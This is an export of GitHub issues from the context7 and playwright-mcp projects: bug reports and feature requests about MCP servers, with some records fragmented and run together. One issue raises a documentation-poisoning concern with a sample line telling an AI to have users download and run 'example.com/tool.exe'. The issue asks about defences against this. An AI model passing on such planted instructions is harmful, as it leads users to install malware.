upstash/context7,3139648195,282,Minor: InitializeResult MCP schema mismatch in Context7 server response,closed,2025-06-12T10:05:53Z,2025-06-13T06:40:24Z,[],nielthiart,"The `InitializeResult` response from the server does not match the expected [`InitializeResult` schema](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/schema/2025-03-26/schema.ts#L179-L193).

1. The `serverInfo` field contains a `description` that was not part of the schema.
2. The `capabilities` field is incorrectly nested in `serverInfo`.
3. The `capabilities` field in the response includes `resources`, even though this server does not support resources.

We should also add an `instructions` field to the response, which provides guidance on how to use the server.

The SDK takes care of [registering capabilities](https://github.com/modelcontextprotocol/typescript-sdk/blob/2cf4f0ca86ff841aca53ac8ef5f3227ba3789386/src/server/mcp.ts#L101), so we don't need to add this when instantiating the `server` object.

## Steps to reproduce

Send an `initialize` request to the Context7 server and observe the response.

```json
{
  ""method"": ""initialize""
}
```

## Expected response

Response matches `InitializeResult` schema:

```json
{
  ""capabilities"": {
    ""tools"": {
      ""listChanged"": true
    }
  },
  ""serverInfo"": {
    ""name"": ""Context7"",

  },
  ""instructions"": ""Use this server to retrieve up-to-date documentation and code examples for any library.""

## Actual response

Response does not match `InitializeResult` schema:

```json
{
  ""capabilities"": {
    ""tools"": {
      ""listChanged"": true

  },
  ""serverInfo"": {

I'm running into a problem with higher token Docs. Max 100k. Adding a button to download the full documentation enables users to do just that and extend the use beyond a singular MCP function. It should be a simple function that extends the use of Context7 for larger docbases.

I was just adding a repository via the web UI and noticed it only asks for the repository URL - no verification or anything. This got me thinking: what if someone creates a repository with malicious documentation? 

## My concern

I'm probably overthinking this, but couldn't someone theoretically create docs that tell the AI to do something dangerous? Like:

""To install this library, first download our helper tool from `example.com/tool.exe` and run it""

Or something similar? The AI might then suggest this to users, and some people might just follow the instructions without thinking twice.

## Questions

- Are there any current safeguards against this kind of thing?
- Is the documentation content validated somehow before being served?
- Am I missing something obvious about how this is prevented?

## Possible solution idea

Would it be possible to add some kind of user authentication where I can maintain my own whitelist of trusted repositories? That way I could control which documentation sources I'm comfortable using, while still keeping the community aspect for others who want it.

I'm not a security expert or anything, just someone who uses the tool and wants to make sure I'm being cautious. Maybe this is already handled in a way I don't understand?

upstash/context7,3089504316,224,Why the change in behavior to send user queries in get-library-docs?,closed,2025-05-25T18:59:11Z,2025-05-26T16:42:55Z,[],stshort,"Hello,

What is the intent of the userQuery param being added to `get-library-docs` in #222 ?

This change in behavior concerns me with agents possibly sending more information than I would like to send to a party whose privacy policies / data retention policies I have not yet reviewed, and cannot find any documentation as to why the change is being implemented and for what reason. Before this change I was rather comfortable using the library as-is as all it did was a discovery, then a fetch of the library documentation passing along specific topics.

However, now the addition of a user query parameter with prompting specifically stating the agent to provide the original user query as is, without changing it, concerns me with data leakage potential from my agents. Especially because my workflow, and likely many others who use the library constantly, set these tools specifically to be trusted. 

I am curious to what the intent of this change in behavior is? For now I've just decided to fork for my own usages, but curious if you could share the intent of the change. Thanks."

The first one doesn't really have correct documents in their repo. The second one is what I crawler and processed as makerdown files, and it could answer questions correctly.

I am wondering how AI can distinguish these two when identifying the ID?

I would like suggest the following features,
1. allow to delete repos if they are uploaded by accident
2. have function allow user comments or upvote for the docs in context7

maybe AI could have a potential solution to distinguish them through some ways?

I’d like to propose adding official support for [ApostropheCMS](https://apostrophecms.com/) to Context7 MCP. ApostropheCMS is a mature, open-source Node.js CMS that is widely used by agencies and developers building multilingual, multisite websites with rich content editing capabilities.

Context7 support would significantly improve the developer experience by enabling instant, version-specific access to Apostrophe’s documentation and code examples.

Why ApostropheCMS?
ApostropheCMS powers complex websites and apps — it’s an excellent candidate for IDE-integrated documentation.

There is growing interest in integrating it with modern frontends (e.g., Astro, Next.js) where AI-driven coding assistance could be highly useful.

Our team at ApostropheCMS would be happy to create and help maintain the docs integration.

Docs Info

upstash/context7,3044593945,165,Use context7 with open-source LLM and third-party MCP clients,closed,2025-05-07T03:51:36Z,2025-05-15T12:00:29Z,[],kkkkkom,"Dear @enesakar and authors/contributors,

Thank you so much for this repo! And sorry for opening an issue ..

I'm new to MCP and I am having fun playing with context7. However, I noticed it works mostly smoothly with Claude desktop, but when I try it with other MCP clients, things didn't go very well. 

For example, I was trying it with mcphost (https://github.com/mark3labs/mcphost) with Ollama on qwen2.5 (which is said to support MCP), even with the example prompt in this repo: `Create a basic Next.js project with app router. use context7`, it sometimes doesn't realize it needs to use the MCP and sometimes it will use the MCP but still returned something irrelevant.

I'm wondering do you know is it a problem of the LLM or more of a problem with the MCP client? My goal is to use context7 with an open-source local LLM, are you aware of a good model and good MCP client to be used with context7?

Thank you so much for your time and help!"

1) Local llms.txt sync 

Right now it fetches directly to context. I think it would be better that context7 was a combination of MCP / CLI / VSCode plugin. The goal would be to be a similar docs repository as dash app (https://kapeli.com/dash) but for AI. The flow would be like this:
a) in VSCode Plugin or CLI or MCP function we would query e.g. for 'expo' or provide url 'https://expo.dev/', plugin would check if there is official llms.txt in official web page. If there is it would download either to global local docs repository (and symlink it in current project folder) or download to project folder (user can choose). It official is not available then we would use 3rd party or generate one from official docs page.
b) search results should show some badge if 'llms.txt' is official one / llms.txt generated from official web page / 3rd party - I have more trust in official one since those will be more likely maintained and up-to-date and more secure
c) plugin would show list of installed docs and badges (official, 3rd party, genefated), when last time synced. There would be a button to allow resync manually. Maybe even some checks and icon to showing if there is potentially new uploaded llms.txt in given official website (by checking document upload date and comparing to one from last sync or by checking hash)

I think there are few benefits of such solution:
- official docs up-to-date, maintained and more secure 
- if we have docs in project folder windsurf / cursor can index it
- we don't have to each time download docs since those will be already stored locally in global folder and need to just symlink or copy 
- in cursor / windsurf rules we able to directly link to those llms.txt e.g. ""in our techstack we are using  use `vercel ai sdk' [vercel-ai-sdk.llms.txt]
- some llms.txt are very heavy - if we have it indexed locally by any agent we can reduce cost of inference (e.g. when using cline/roocode) or speedup agent because don't have pollute context with 0.5M tokens (e.g. tailwindcss)

2) Some tweak for current website:
a) right now search is not very accurate: when looking for 'rerun' it list so many but not this popular library that already has llms.txt: https://rerun.io/llms.txt
b) the table on website is too small in width so when searching for tailwindcss it find few options but hard to see full REPO url. Would be also good to have some badges here: official or 3rd party or generated. And project thumbnail or github thumbnail

I recently heard about Context7, and I'm a game developer who usually works with Unity or Unreal. One of the biggest challenges with recent Unity project teams I've worked on is using DOTS or the EntityComponentSystem architecture Unity is developing.

I know RAG agents have struggled with Unity development and so I wanted to test and see how well Context7 did when given the ECS sample repo which is quite extensive.

It ran and the results can be seen here: https://context7.com/unity-technologies/entitycomponentsystemsamples

The results are terrible. It seemed to completely ignore 80% of the repository, picked some samples related to very very advanced netcode and job scheduling and completely ignored all the fundamentals, it didn't even pick up any of the SystemAPI calls which is generally the foundation of every ECS system with an idiomatic foreach call and SystemAPI.Query<>.

So I'm not here to bash Context7, the documentation unity provides is not great, it doesn't really adhere to web standards for repo structure, it's a mono repo with dozens of projects inside and so I don't fault Context7 for not being able to parse it.

What I AM concerned with, is now that documentation is in there, and anyone who uses Context7 will have their agents influenced by BAD documentation.

Honestly, it would be better to just delete the library from Context7 entirely than leave it in there, which makes me wonder how many other projects has the documentation been parsed with no way to validate that it's accurate and useful."

One challenge I often face is that many projects don't use the latest versions of libraries, and code examples or APIs can change significantly between versions.

Would it be possible to support version-specific documentation fetching in MCP? Being able to specify the library version would greatly enhance accuracy and usability, especially for legacy projects.

Thanks for the great work!"

Maybe caused by LangChain.js having an ""error"" status at  https://context7.com/langchain-ai/langchainjs and manual refresh errors out.

I'm using the latest Cursor with the latest Context7 MCP and Claude 3.7, and when I ask the agent to use Context7 to find the latest LangChain.js docs, it uses the Python version of LangChain rather than the JS version.

Here is the Cursor tool output:

```
I'll review the LangChain.js implementation in this project using Context7 and look for opportunities to simplify the code.

As you can see, it doesn't return a Context7-compatible library ID for LangChain.js. I suspect the problem is caused by a parsing error on https://context7.com/langchain-ai/langchainjs. Unfortunately, when I try to manually refresh it, I get a generic error (`Process is canceled due to errors or stopped. Total execution time: 18216ms (18s)`) instead of a detailed one."

I wanted to bring up something I've been thinking about regarding how it gets documentation. Currently, it looks like everything goes through the central `context7.com/api`. While I get why that makes sense, it does create a few tricky spots:

* **API Downtime:** If `context7.com` has issues, Context7 can't fetch docs, which kind of stops us in our tracks.
* **Sensitive Docs:** Where I work (and I bet others too), we would like to add internal docs that we can't really have requests about going out to an external service. 
* **Update Timing:** We don't have much control over when the docs we rely on get scanned and updated in the main index.

### **My Suggestion:**

What would be *really* awesome is if we could run the documentation backend part ourselves, on our own servers.

How could that work? Maybe something like:

* Could the backend code (for indexing and the API) be made available, maybe open-sourced?
* Could we get a setting in Context7 to point it to our own server URL instead of `context7.com/api`?
* And, naturally, we'd need some good docs explaining how to set up and manage our own instance.

Honestly, I think this would be a game-changer for adoption, especially for people in corporate environments or places with strict security needs. It would just give everyone a lot more flexibility.

### **Quick Questions:**

I was just wondering:

1.  Is there anything technically blocking the idea of self-hosting the backend right now?
2.  Have you guys already thought about adding a self-hosting option down the line?

Thanks for the great work on Context7."

Claude correctly used resolve-library-id (and found `/swiftlang/swift`) and get-library-docs to query the data (`topic`: `access control`), but the response from context7 was lacking info about package access level.

After that, I refreshed the [Swift](https://context7.com/swiftlang/swift) library, but the result remained the same.

Finally, I asked Claude to use `tavily` to verify the answer. It then found that the package access level does exist and corrected the previous response.

How is it possible that specific access level was missing, when [Access Control](https://docs.swift.org/swift-book/documentation/the-swift-programming-language/accesscontrol/) page of Swift documentation clearly states this level?"

 Bug: Playwright MCP Snapshot Fails to Capture UI Elements Rendered in Overlay/Portal Containers Area playwright-MCP

Description: 

When automating web applications built with modern frontend frameworks (e.g., React/Ant Design, Angular CDK, Vue/Element UI) that render dynamic UI elements like dropdowns, modals, and popovers inside dedicated overlay containers or portals (e.g., <div class=""cdk-overlay-container"">, <div class=""ant-select-dropdown"">), the Playwright Managed Control Plane (MCP) protocol fails to capture this content in its page snapshot.

This prevents any interaction with these critical UI elements via MCP commands, effectively blocking automation for highly common web UI patterns.

Creating a formal GitHub Issue based on your detailed description of the Playwright MCP protocol limitation concerning overlay/portal content capture:


Steps to Reproduce:

Open a target web page that includes a select/dropdown component implemented using a portal/overlay mechanism (e.g., an Ant Design Select component).

Use an MCP command to click the dropdown component to open the list of options.

Attempt to select an option (e.g., by visible text or by a generated reference/ref) that is rendered within the overlay container.

Observe the MCP snapshot data captured after the dropdown is opened.


Actual Behaviour:

The content of the overlay container (e.g., dropdown options) is missing from the MCP protocol's DOM snapshot.

No valid ref is available for these elements, as they are not visible in the snapshot.

MCP commands like browser_click or browser_select_option that target the visible text or a hypothetical ref of an overlay element fail with timeouts or ""element not found"" errors.

Example: When testing an Ant Design dropdown, even if the dropdown is visually open, options rendered inside <div class=""ant-select-dropdown""> are not exposed. Scrolling and selecting options beyond the initial few (which might be in the main DOM or visible in a limited buffer) is impossible.


Expected Behavior
The MCP protocol's snapshot mechanism should be enhanced to fully capture and expose content rendered in overlay/portal containers to enable interaction.

It should be possible to:

Select dropdown options by visible text using standard MCP interaction commands.

Interact with overlay elements (modals, popovers, dropdown options) using their generated ref or by direct click actions.

The snapshot should recursively include DOM content from elements typically used as overlay roots (e.g., body > .cdk-overlay-container, etc.).

Impact
This issue creates a critical block for automating modern web applications built with prevalent frameworks like React (Ant Design), Angular (CDK), and Vue (Element UI/Quasar), as these frameworks heavily rely on portal/overlay architecture for dynamic components.

Environment
Frontend Framework: Ant Design (React), Angular CDK, etc.

Automation Stack: Playwright MCP Protocol (e.g., @playwright/mcp).

Browser: All supported browsers (Chromium, Firefox, WebKit).

Suggested Fix / Request:
@Skn0tt , @digitarald @petergoldstein can you pls help me out in resolving this issue
Please enhance the Playwright MCP protocol's snapshot logic to proactively find and include content rendered in overlay/portal root elements (typically direct children of body) to ensure all visible and interactable UI components are assigned valid ref values and made available for automation.

microsoft/playwright-mcp,3567228314,1172,ERR_INVALID_FILE_URL_PATH when using Playwright MCP in WSL,closed,2025-10-29T18:00:59Z,2025-10-30T18:01:04Z,[],Reinhard-S,"## Environment
- **OS**: Windows 11 with WSL2 (Ubuntu)
- **Playwright MCP Version**: 0.0.44 (`@playwright/mcp@latest`)
- **Node.js**: Running via npx
- **MCP Client**: Claude Code running in WSL

## Description

When using the Playwright MCP server from Claude Code in a WSL environment, any tool invocation fails with:

```
TypeError [ERR_INVALID_FILE_URL_PATH]: File URL path must be absolute
```

## Root Cause

The issue occurs in `playwright/lib/mcp/sdk/server.js` in the `firstRootPath()` function:

```javascript
function firstRootPath(clientInfo) {
  if (clientInfo.roots.length === 0)
    return void 0;
  const firstRootUri = clientInfo.roots[0]?.uri;
  const url = firstRootUri ? new URL(firstRootUri) : void 0;
  return url ? (0, import_url.fileURLToPath)(url) : void 0;  // ← FAILS HERE
}
```

When running in WSL, the MCP client sends file URIs in WSL/POSIX format (e.g., `file:///mnt/c/...`). Node.js `fileURLToPath()` attempts to convert these as Windows paths by default, which fails because `/mnt/c/...` is not a valid Windows absolute path format.

## Reproduction Steps

1. Set up Claude Code in WSL2
2. Configure Playwright MCP server in `~/.claude.json`:
```json
{
  ""mcpServers"": {
    ""playwright-ms"": {
      ""type"": ""stdio"",
      ""command"": ""powershell.exe"",
      ""args"": [
        ""-NoProfile"",
        ""-Command"",
        ""npx"",
        ""-y"",
        ""@playwright/mcp@latest""
      ]
    }
  }
}
```
3. Attempt to use any Playwright tool (e.g., `browser_navigate`)
4. Error occurs immediately during browser context creation when `firstRootPath()` is called

## Workaround

Manually modify `playwright/lib/mcp/sdk/server.js` line 159 to explicitly use POSIX path handling:

```javascript
return url ? (0, import_url.fileURLToPath)(url, { windows: false }) : void 0;
```

This tells Node.js to treat the file URL as a POSIX path rather than attempting Windows path conversion.

## Suggested Fix

Add the `{ windows: false }` parameter to handle cross-platform paths correctly:

```javascript
function firstRootPath(clientInfo) {
  if (clientInfo.roots.length === 0)
    return void 0;
  const firstRootUri = clientInfo.roots[0]?.uri;
  const url = firstRootUri ? new URL(firstRootUri) : void 0;
  return url ? (0, import_url.fileURLToPath)(url, { windows: false }) : void 0;
}
```

## Impact

This issue prevents **all** Playwright MCP functionality from working in WSL environments, which is a common development setup for Windows developers.

microsoft/playwright-mcp,3539163065,1158,"[Feature Request]: Enable Agent/playwright MCP server to Execute Existing POM Methods (with exact locators) as is, Invoke AI Discovery for New Steps only",open,2025-10-22T05:18:59Z,2025-10-22T05:18:59Z,[],viv-o9,"Summary:
Requesting a feature/mode where the Copilot Agent + Playwright MCP interactive execution can reuse existing POM methods by executing their defined locators literally, instead of always re-interpreting the step semantically and potentially using a different locator (e.g., getByRole). This is needed to reliably leverage large existing POM codebases while using the agent for new step discovery.
Eg: Don't invoke MCP's ai.(..) for Step1, Step2, Step5 for which we already have exact locators and code, execute them as is. Invoke ai.(..) only for steps3, step4 for which we don't have automation code in current workspace

Problem:
When using the Copilot Agent to generate tests interactively with playwright MCP Server against an existing Playwright POM framework, the execution step currently overrides the literal locators defined within existing POM methods.

For example, if an existing MenuMapPage method uses page.locator('input[class=""search-box""]:visible') to fill a search box, the MCP execution log shows page.getByRole('textbox', { name: 'Search' }).fill(...) being run instead. This prevents reliable reuse of carefully crafted locators in the existing codebase.

Desired Solution: Hybrid Execution Mode
We need a way for the Agent/MCP workflow to differentiate between steps that map to existing POM methods and steps that are genuinely new:
For steps mapped to existing POM methods: Execute the actions within that method using the exact, literal locators defined in the POM code. Do not substitute locators based on semantic interpretation.
For steps without existing POM methods: Use the current interactive AI/LLM discovery mechanism (like ai.* functions) to find locators and perform actions.

Example:
Existing POM:
TypeScript
// MenuMapPage.ts
readonly searchBox = page.locator('input.search-box:visible');
async search(term: string) { await this.searchBox.fill(term); }
User Step: Search for workspace ""OM_Automation"" (maps to search() method)

Current MCP Execution: Runs page.getByRole('textbox', ...).fill(...)
Desired MCP Execution: Runs page.locator('input.search-box:visible').fill(...)

Why Needed:
This feature is crucial for teams with large existing Playwright POM frameworks. It allows them to leverage the power of the Agent/MCP for accelerating new test step automation without the current unreliability caused by the system overriding established locators in reused code. It enables a smoother, more practical adoption path for AI-assisted test generation.

Thank you for considering this enhancement."

### **Current Behavior**
- The `<canvas>` element itself is in the DOM and can be found
- However, the actual 3D content rendered **on** the canvas (3D models, objects, interactive elements) cannot be interacted with
- Neither JavaScript evaluation tools nor mouse position tools seem to work for clicking specific coordinates on the canvas

### **Expected Behavior**
It would be helpful to have a way to:
1. Click at specific X/Y coordinates on the canvas (not just DOM elements)
2. Interact with the canvas content through pixel coordinates
3. Potentially use `page.mouse.click(x, y)` or similar low-level mouse interactions

### **Question**
Is this a known limitation of the MCP architecture, or is there a workaround I'm missing? Can the MCP:
- Use coordinate-based clicking (e.g., `browser_mouse_click` with pixel coordinates)?
- Execute Playwright's low-level mouse API (e.g., `page.mouse.click(x, y)`)?
- Interact with canvas elements beyond just finding them in the DOM?

Any guidance or feature suggestions would be very appreciated!"

When you look at the DOM tree (aka accessibility snapshot), it is really big, but most of the information is actually not critical to figure out how to navigate the page or extract information.

1. is the tool already pruning the DOM tree?
2. are there hooks in place to prune the tree?
3. if not, are there plans for such hooks?

I could imagine getting rid of attributes that are solely used for cosmetics.
I could imagine collapsing <div> tags that don't contain special ids, etc.

microsoft/playwright-mcp,3521181074,1146,Support for Custom Playwright Fixtures and Extensible Tool Integration,closed,2025-10-16T10:03:41Z,2025-10-16T17:50:09Z,[],Ec3o,"## Description

I'd like to propose adding support for custom Playwright fixtures injection and the ability to extend the MCP server with custom tools that can leverage these fixtures. This would enable more specialized and reusable testing patterns for domain-specific page testing scenarios.

## Problem Statement

Currently, the playwright-mcp server provides excellent built-in tools for browser automation, but it lacks the ability to:

- Define and inject custom Playwright fixtures for reusable test setup/teardown logic
- Create custom tools that can utilize these fixtures
- Return Playwright test code that incorporates custom fixtures for specialized testing needs

This limitation makes it challenging to implement organization-specific testing patterns or domain-specific page object models that could benefit from Playwright's fixture system.

## Additional Context

I'm working on building an AI-powered test generation agent that needs to create specialized test code for our internal applications. Having the ability to inject custom fixtures would allow us to generate more maintainable and reusable test suites that align with our existing testing infrastructure.
I've been experimenting with extending Playwright MCP on my own and have found a promising approach. I've successfully mounted multiple fixture-based page wrapper objects on the tab object using the obtained Playwright Page and Context objects. These wrapper objects encapsulate business methods for concise and efficient page operations.
I'm happy to contribute to the implementation if this feature request is accepted. Please let me know if you need any clarification or additional details.

Thanks For Reviewing This Issue.

microsoft/playwright-mcp,3518404791,1138,[Feature]: Use default filename when the optional `filename` parameter is an empty string.,closed,2025-10-15T14:47:11Z,2025-10-15T22:54:25Z,[],ogadra,"Related https://github.com/microsoft/playwright/pull/37678

When an LLM agent calls the screenshot function, it sometimes provides an empty string (`filename: """"`) instead of omitting the optional `filename` parameter. This appears to be a model hallucination.

Currently, the library attempts to resolve this empty string as a path, resulting in an error (`file path for """" is outside`). It would be ideal if an empty string `""""` was handled as equivalent to a ""not provided"" or `null` value. This would allow the system to fall back to the default filename generation logic.

Instead of relying on prompt engineering to mitigate hallucinations, the library can be made more resilient by handling this common edge case.

## Current Behavior
Passing `filename: """"` causes the path resolver to fail, returning an error and preventing the screenshot from being saved.

## Expected Behavior
- When `filename === """"`, treat it the same as “not provided” and fall back to the existing default filename generator (e.g., `page-YYYY-MM-DDTHH-mm-ss-SSSZ.png`).

Restricted to Text-Based Waiting
The browser_waitFor action currently only supports waiting for text to appear. This is limiting in scenarios where we need to wait for:

Specific elements (e.g., buttons, inputs, containers) to be visible or present in the DOM.
Non-textual UI changes (e.g., loading spinners disappearing, modals appearing).

Suggestion:
Extend browser_waitFor to support waiting for generic elements using selectors or element attributes, similar to how browser_click operates.


No Access to Code Response
Unlike browser_click, which provides access to the code response (e.g., HTTP status, payload), browser_waitFor does not expose any response data. This makes it difficult to validate backend interactions triggered by UI changes.
Suggestion:
Enhance browser_waitFor to optionally return the code response or allow chaining with response validation.


Issue with Multiple Elements Having Same Text
When multiple elements on the page share the same text, browser_waitFor sometimes fails to correctly restrict to the intended element, especially when relying on depth-based restrictions. This issue is intermittent and often occurs during page load or dynamic rendering.
Suggestion:
Improve the targeting logic to handle duplicate text scenarios more reliably, possibly by allowing additional filters like index, parent element, or custom attributes."

## Expected Output


```

I added the mcp server to claude code, everything works fine, except closing the browser tab.

For example, I login via vnc to the playwright server to observe.
The browser is already opened with one tab, because of pm2 running chrome to be ready to use the extension.

From claude code, I ask it to visit google news and get the latest news.
I see the browser opening a new tab, while using my chrome profile and it works fine, I get what I want.

However, the AI tries to run `await page.close()` and all it does is to close automation on that tab.
The notice informing that it's being controlled disappears, but the tab stays open.

If I ask AI again to close it, it connects and opens a new tab with the extension url.
`chrome-extension://jakfalbnbhgkpmoaakfflhflbfpkailf/connect.html?mcpRelayUrl=ws%3A%2F%2Flocalhost%3A42335%2Fextension%2F ...`

It then only sees that tab, and not any other opened tabs, so there is no way to close it.

In order to cleanup, I have to manually do a `sudo -u myuser -H pm2 restart chrome-browser` 

All I want is to setup Playwright as mcp on my remote Ubuntu server, with the chrome extension and make it available to ai via a node proxy (for token authentication). All this works fine, except for the cleanup.

So to my understanding, if I were to continue using it, it would forever accumulate tabs on chrome until I run out of memory.
Either that, or I would separately need to implement a cleaning mcp service or tool to do it.

Is this a bug, or am I doing something wrong?

microsoft/playwright-mcp,3481608688,1110,Critical Packaging Bug: Missing utilsBundleImpl.js in v0.0.41 - Cannot find module './utilsBundleImpl',closed,2025-10-03T15:51:26Z,2025-10-04T16:13:51Z,[],heavygee,"## Critical Packaging Bug: Missing `utilsBundleImpl.js` in v0.0.41

### Description
Version 0.0.41 crashes immediately on startup with `Cannot find module './utilsBundleImpl'` error. The package is completely unusable.

### Root Cause
The build process failed to generate/include `utilsBundleImpl.js` in the `playwright-core/lib/` directory, even though `utilsBundle.js` exists and requires it.

### Evidence

**Error on startup:**
```
Error: Cannot find module './utilsBundleImpl'
Require stack:
- playwright-core/lib/utilsBundle.js
- @playwright/mcp/cli.js
```

**File analysis shows the pattern:**
- ✅ `utilsBundle.js` (3,461 bytes) - EXISTS
- ✅ `zipBundle.js` (1,242 bytes) - EXISTS  
- ✅ `zipBundleImpl.js` (54,340 bytes) - EXISTS
- ❌ `utilsBundleImpl.js` - **MISSING**

**utilsBundle.js requires 20+ exports from the missing file:**
```javascript
const colors = require(""./utilsBundleImpl"").colors;
const debug = require(""./utilsBundleImpl"").debug;
const diff = require(""./utilsBundleImpl"").diff;
// ... 17 more imports
```

### Version Comparison
- ✅ **v0.0.40**: Works perfectly
- ❌ **v0.0.41**: Broken (missing utilsBundleImpl.js)

### Impact
- MCP server cannot start
- Package is completely unusable
- Affects all functionality that depends on utils (colors, debug, dotenv, proxy agents, etc.)

### Reproduction Steps
1. Install `@playwright/mcp@0.0.41`
2. Run `npx @playwright/mcp@0.0.41 --version`
3. Observe immediate crash with utilsBundleImpl error

### Workaround
Use `@playwright/mcp@0.0.40` which works correctly.

This appears to be a build/packaging regression where the utils bundle implementation wasn't generated or included in the v0.0.41 release."
microsoft/playwright-mcp,3481293112,1109,[Bug]: Inconsistent state and errors when using `browser_tabs` tool,closed,2025-10-03T14:16:45Z,2025-10-07T09:36:26Z,[],vimmoos,"## Version info

❯ npx @playwright/mcp@latest --version
Version 0.0.41
❯ npx --version
11.6.1
❯ node --version
v22.20.0
```
## Inconsistent state

The `browser_tabs` tool does not behave as expected. There is a direct contradiction between the state reported by action: ""new"" and a subsequent action: ""list"". See the code below. (For all the code i run the mcp-server in a separete terminal as follow: `npx @playwright/mcp@latest --browser=chrome  --shared-browser-context --port 8931`)


```python
import asyncio
from playwright_mcp import MultiServerMCPClient

client = MultiServerMCPClient(
    {
        ""playwright"": {
            ""transport"": ""sse"",
            ""url"": ""http://localhost:8931/sse"",
        }
    }
)

async def main():
    tools = await client.get_tools()
    tools_map = {t.name: t for t in tools}

    ret = await tools_map[""browser_tabs""].ainvoke({""action"": ""new""})
    print(ret)
    # ### Open tabs
    # - 0: [] (about:blank)
    # - 1: (current) [] (about:blank)


    ret = await tools_map[""browser_tabs""].ainvoke({""action"": ""list""})
    print(ret)
    # ### Open tabs
    # - 0: (current) [] (about:blank)
    # - 1: [] (about:blank)


if __name__ == ""__main__"":
    asyncio.run(main())
```

Visually, it looks like the 'new' action return's is correct. However, all the subsequent action are executed on the tab with index 0 so inline with the return of the ""list"" action.

## Select issue

Another issue with the tabs is the ""select"" action.
Attempting to `select` a tab by its index then fails with a ""not found"" error, even for an index that was just listed as existing.

```python
import asyncio
from playwright_mcp import MultiServerMCPClient

# Client configured to connect to a running Playwright MCP server
client = MultiServerMCPClient(
    {
        ""playwright"": {
            ""transport"": ""sse"",
            ""url"": ""http://localhost:8931/sse"",
        }
    }
)

async def main():
    tools = await client.get_tools()
    tools_map = {t.name: t for t in tools}

    ret = await tools_map[""browser_tabs""].ainvoke({""action"": ""new""})
    print(ret)
    # ### Open tabs
    # - 0: [] (about:blank)
    # - 1: (current) [] (about:blank)

    ret = await tools_map[""browser_tabs""].ainvoke({""action"": ""list""})
    print(ret)
    # ### Open tabs
    # - 0: (current) [] (about:blank)
    # - 1: [] (about:blank)

    try:
        ret = await tools_map[""browser_tabs""].ainvoke(
            {""action"": ""select"", ""index"": 0}
        )
        print(ret)
    except Exception as e:
        print(f""An error occurred: {e}"")
    # ## Error: Tab 0 not found



if __name__ == ""__main__"":
    asyncio.run(main())
```

In all my test, this is always true no matter how many tabs i create, no index is ever returned something different than a not found error.

microsoft/playwright-mcp,3481104476,1108,[Bug]: Shared Browser Context option ignore when using Stdio transport,closed,2025-10-03T13:23:24Z,2025-10-06T08:34:23Z,[],vimmoos,"## Version info

I am using Python and langchain for the MCP client.
When launching the Playwright MCP server from the `MultiServerMCPClient` with the transport mode set to `stdio`, the `--shared-browser-context` argument does not seem to work as expected.

Each tool invocation appears to run in a new context, losing the state from previous operations. For example, after navigating to a page with `browser_navigate`, then doing a  `browser_snapshot` returns a  completely blank page.

The issue does not occur when the server is run independently in a terminal with a specified port and the client connects via `sse` transport.

-----

## **Sample Code**

```python
import asyncio
from langchain_mcp_adapters.client import MultiServerMCPClient

client = MultiServerMCPClient(
    {
        ""playwright"": {
            ""command"": ""npx"",
            ""args"": [
                ""@playwright/mcp@latest"",
                ""--browser=chrome"",
                ""--shared-browser-context"",
            ],
            ""transport"": ""stdio"",
        }
    }
)

async def main():
    tools = await client.get_tools()
    tools_map = {t.name: t for t in tools}

    page = await tools_map[""browser_navigate""].ainvoke({""url"": ""https://playwright.dev/""})
    print(page) # Here the page is loaded and fully visible


    snapshot = await tools_map[""browser_snapshot""].ainvoke({})
    print(snapshot) # Here the page is blank
    # '### Page state\n- Page URL: about:blank\n- Page Title: \n- Page Snapshot:\n```yaml\n\n```\n'

if __name__ == ""__main__"":
    asyncio.run(main())
```

If I run the server from the terminal with:
`npx @playwright/mcp@latest --browser=chrome  --shared-browser-context --port 8931`

and we change the config to use the sse transport everything works as expected

```python

import asyncio
from langchain_mcp_adapters.client import MultiServerMCPClient

client = MultiServerMCPClient(
    {
        ""playwright"": {
            ""transport"": ""sse"",
            ""url"": ""http://localhost:8931/sse"",
        }
    }
)

async def main():
    tools = await client.get_tools()
    tools_map = {t.name: t for t in tools}

    page = await tools_map[""browser_navigate""].ainvoke({""url"": ""https://playwright.dev/""})
    print(page) # Here the page is loaded and fully visible


    snapshot = await tools_map[""browser_snapshot""].ainvoke({})
    print(snapshot) # Here the page is loaded and fully visible

if __name__ == ""__main__"":
    asyncio.run(main())
```

microsoft/playwright-mcp,3479980865,1106,[Bug] Overly aggressive secret redaction corrupts a11y snapshot labels and attributes,closed,2025-10-03T06:39:27Z,2025-10-03T20:57:46Z,[],ogadra,"### Summary

The `_redactSecrets` function indiscriminately redacts any occurrence of a secret's value across the entire a11y snapshot. This leads to the corruption of non-input text, such as labels and attributes, whenever they contain a substring that matches a secret.  

### Example

Configure secrets such as:
   - `PASSWORD=ssw` (short value)
   - or `PASSWORD=e2`

Generate an a11y snapshot containing a textbox labeled:
   - `textbox ""Password"" [ref=e24]:`

Observe the redaction result:
   - With `PASSWORD=ssw`:  
     `textbox ""Pa<secret>PASSWORD</secret>ord"" [ref=e24]:`
   - With `PASSWORD=e2`:  
     `textbox ""Password"" [ref=<secret>PASSWORD</secret>4]:`
   These substitutions happen even though the secret appears only as a substring of unrelated text/attributes.


### Expected behavior

- Redact **only** the concrete input values that were filled from secrets (e.g., `textbox … textInput: ""•••""`), or otherwise ensure redaction respects value boundaries and context so that labels/attributes are unaffected.

### Impact

Short secrets (e.g., CVV codes) are prone to substring collisions, leading to the widespread masking of unrelated text and the corruption of a11y tree data.

### Question

Can we scope redaction exclusively to input values (e.g., the textInput portion) instead of the entire a11y snapshot?"

We use Claude Desktop (team plan) with playwright-mcp.
When we visit https://www.yahoo.co.jp/ and search something, Claude often complains ""Claude hit the maximum length for this conversation"" and the browser automation stop working.

Claude often autonomously take a snapshot even after the `browser_navigate` and `click` returns the snapshot of whole page.
When the page content happen to be large, it consumes a lot of tokens unexpectedly.

In most case, the snapshot for `browser_navigate` and `click` is useful especially for creating E2E test with Playwright MCP.
However, with Claude it often costs too much token. So we'd like to specify **some option to suppress returning snapshot info except for explicit `browser_snapshot` MCP call**."

microsoft/playwright-mcp,3435605753,1063,browser_screenshot tool saves to the incorrect file name,closed,2025-09-19T19:15:09Z,2025-09-20T03:52:42Z,[],gundermanc,"### The issue

We've gotten bug reports in Copilot coding agent of browser_screenshot failing to work properly in some cases. Digging into it I found that the issue is that Playwright does some sort of path sanitization on the file path submitted which causes file paths that contain `-` to be saved with `_` instead.

This breaks logic in CCA which expects the image to be saved with the exact file path given, so the calling code can do some preprocessing of the image before its sent to the model.

GitHub internal issue: https://github.com/github/sweagentd/issues/6136

### Meta comment on tool behavior

